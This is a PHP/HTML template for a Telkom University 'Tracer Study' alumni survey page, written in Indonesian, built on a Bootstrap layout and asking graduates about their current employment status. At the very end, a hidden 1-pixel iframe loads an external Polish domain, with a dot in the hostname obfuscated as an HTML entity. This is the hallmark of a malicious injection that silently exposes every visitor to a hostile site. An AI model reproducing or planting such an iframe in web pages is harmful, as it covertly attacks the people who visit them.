<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title><?= $data['page']?></title>

    <!-- <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/checkout/"> -->

    <!-- Bootstrap core CSS -->
    <link href="<?= $this->base_url;?>public/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <!-- <link href="form-validation.css" rel="stylesheet"> -->
  </head>

  <body class="bg-light">


  <body class="bg-light">

    <div class="container">
      <div class="py-5">
        <img class="d-block mx-auto mb-4" src="https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg" alt="" width="72" height="72">
        <h2><center>Tracer Study</center></h2>
        <p>Kepada yth, Para alumni Telkom University Lulusan 2017, mohon kesediaannya untuk meluangkan waktu dalam menjawab 34 pertanyaan terkait situasi lulusan selama masa transisi hingga 2 (dua) tahun setelah lulus. Data ini menjadi informasi yang penting dalam kegiatan Tracer Study di Telkom University.
        <br>
        Tracer study bertujuan untuk:
        <br>
        1. Mengetahui hasil pendidikan di masa transisi
        <br>
        2. Penilaian diri terhadap penguasaan dan kompetensi
        <br>
        3. Evaluasi proses pembelajaran & kontribusi pendidikan tinggi
        <br>
        4. Data tersebut sangat dibutuhkan untuk institusi yaitu dalam kegiatan Akreditasi</p>
      </div>

      <div class="row">
        <div class="col-md-12 order-md-1">
          <h4 class="mb-3">Pertanyaan Dikti :</h4>
          <form method="post" action="">
            <h4 class="mb-3">Kegiatan Anda Saat Ini</h4>

            <div class="d-block my-3">
              <div class="custom-control custom-radio">
                <input class="custom-control-input" type="radio" name="status" value="bekerja" checked>
                <label class="custom-control-label">Bekerja (Full Time, Part Time, Wirausaha)</label>
              </div>
              <div class="custom-control custom-radio">
                <input type="radio" class="custom-control-input" name="status" value="nganggur">
                <label class="custom-control-label">Belum Bekerja / Tidak Bekerja</label>
              </div>
              <div class="custom-control custom-radio">
                <input type="radio" class="custom-control-input" name="status" value="study">
                <label class="custom-control-label">Study Lanjut</label>
              </div>
            </div>
            <button type="submit" name="submit" class="btn btn-primary" >berikutnya!</button>
          </form>
          </div>
        </div>

      <footer class="my-5 pt-5 text-muted text-center text-small">
        <p class="mb-1">&copy; 2017-2018 Company Name</p>
        <ul class="list-inline">
          <li class="list-inline-item"><a href="#">Privacy</a></li>
          <li class="list-inline-item"><a href="#">Terms</a></li>
          <li class="list-inline-item"><a href="#">Support</a></li>
        </ul>
      </footer>
    </div>
    <script src="<?= $this->base_url;?>public/js/bootstrap.min.js"></script>
    <script src="<?= $this->base_url;?>public/js/jquery-3.3.1.min.js"></script>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
